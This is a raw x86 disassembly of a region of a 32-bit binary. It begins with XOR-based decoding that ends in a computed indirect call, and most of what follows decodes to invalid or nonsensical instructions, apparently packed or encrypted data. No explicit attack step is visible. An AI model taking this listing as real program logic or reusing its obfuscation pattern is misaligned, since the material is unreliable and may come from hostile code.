  40de0d:	mov    al,0xf3
  40de0f:	mov    ecx,0xb26b6264
  40de14:	mov    DWORD PTR [ebp+0x8],eax
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx-0x19f771e3],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40debb
  40de8e:	and    DWORD PTR [edx-0x5e],0x7a
  40de92:	pop    edx
  40de93:	sbb    eax,0x9c142aa0
  40de98:	mov    ecx,0x4aa6bf4c
  40de9d:	cmp    eax,0xf6baf567
  40dea2:	das    
  40dea3:	push   ebp
  40dea4:	icebp  
  40dea5:	fs pop edi
  40dea7:	je     0x40dea5
  40dea9:	repnz adc al,0x38
  40deac:	mov    cl,0xc0
  40deae:	into   
  40deaf:	jmp    0x4ebf:0x65c8e4ec
  40deb6:	jmp    0x40def3
  40deb8:	add    al,0x23
  40deba:	push   esp
  40debb:	mov    edi,0x88d462eb
  40dec0:	aam    0x3e
  40dec2:	pop    edi
  40dec3:	enter  0x5587,0x1d
  40dec7:	push   cx
  40dec9:	sbb    BYTE PTR [esi],bh
  40decb:	sub    al,BYTE PTR [ebx]
  40decd:	mov    DWORD PTR [edx+0x3a],eax
  40ded0:	dec    eax
  40ded1:	pop    ss
  40ded2:	push   edi
  40ded3:	mov    eax,ds:0xe338e5db
  40ded8:	rol    WORD PTR [ecx+eax*1],1
  40dedc:	mov    ecx,cs
  40dede:	xchg   edx,eax
  40dedf:	dec    edx
  40dee0:	(bad)  
  40dee1:	mul    DWORD PTR [esi-0x2b827d31]
  40dee7:	js     0x40deae
  40dee9:	out    dx,eax
  40deea:	outs   dx,DWORD PTR ds:[esi]
  40deeb:	xchg   ebx,eax
  40deec:	inc    esi
  40deed:	mov    edi,0x1edd6fba
  40def2:	stc    
  40def3:	and    al,0xc8
  40def5:	icebp  
  40def6:	mov    bl,0xd0
  40def8:	inc    esp
  40def9:	jo     0x40df61
  40defb:	push   cs
  40defc:	call   0x4481993d
  40df01:	(bad)  
  40df02:	into   
  40df03:	out    dx,eax
  40df04:	xchg   edx,eax
  40df05:	add    ebp,0x3e8341cc
  40df0b:	xchg   DWORD PTR [ebp+0x7],esp
  40df0e:	adc    cl,0xbb
  40df11:	inc    eax
  40df12:	cld    
  40df13:	and    eax,DWORD PTR [ebx+ebx*2+0x589e9148]
  40df1a:	add    eax,0xe9f834f5
  40df1f:	jg     0x40deef
  40df21:	xchg   ebp,eax
  40df22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df23:	clc    
  40df24:	lahf   
  40df25:	cwde   
  40df26:	xor    eax,0x268f494e
  40df2b:	pop    esi
  40df2c:	mov    esi,0xd1c1788a
  40df31:	es test ecx,eax
  40df34:	mov    al,ds:0x8a30fbe4
  40df39:	addr16 mov bl,0xe4
  40df3c:	adc    al,0x68
  40df3e:	into   
  40df3f:	test   DWORD PTR [edi-0xd],0xc357b521
  40df46:	fdiv   QWORD PTR [ebx-0xe]
  40df49:	rol    BYTE PTR [ebx],0xcf
  40df4c:	mov    al,ds:0xdc525ec0
  40df51:	ds push 0x51accdfa
  40df57:	aam    0x1c
  40df59:	retf   0x65e1
  40df5c:	lds    eax,FWORD PTR [ebp-0x62]
  40df5f:	es es push esp
  40df62:	std    
  40df63:	push   edi
  40df64:	imul   ebp,DWORD PTR [ecx+edi*4+0x22],0x100eec84
  40df6c:	into   
  40df6d:	(bad)  
  40df6e:	cmp    DWORD PTR [eax],ebp
  40df70:	sub    edi,ebp
  40df72:	jno    0x40df79
  40df74:	dec    eax
  40df75:	add    DWORD PTR [edi],ebx
  40df77:	sti    
  40df78:	mov    eax,0x2be5dad3
  40df7d:	mov    ds:0x86015150,al
  40df82:	and    bl,dl
  40df84:	lea    eax,[ebp+0x2f9717f8]
  40df8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df8b:	lds    edx,FWORD PTR [ebx+0x72]
  40df8e:	(bad)  
  40df8f:	fadd   QWORD PTR [esi]
  40df91:	repnz pop esp
  40df93:	mov    ebp,0xd32f43ac
  40df98:	push   es
  40df99:	add    ch,BYTE PTR [edx+0x3b]
  40df9c:	arpl   WORD PTR [eax],di
  40df9e:	pop    edx
  40df9f:	push   0x37
  40dfa1:	out    0x1c,al
  40dfa3:	shl    BYTE PTR [ecx],1
  40dfa5:	jb     0x40df75
  40dfa7:	out    0x79,eax
  40dfa9:	sbb    ecx,ecx
  40dfab:	dec    edi
  40dfac:	dec    ebx
  40dfad:	sbb    BYTE PTR [esi-0x503e70ad],0x1a
  40dfb4:	aas    
  40dfb5:	cmp    al,0x11
  40dfb7:	jecxz  0x40dfb2
  40dfb9:	inc    ebx
  40dfba:	xchg   ebx,ecx
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
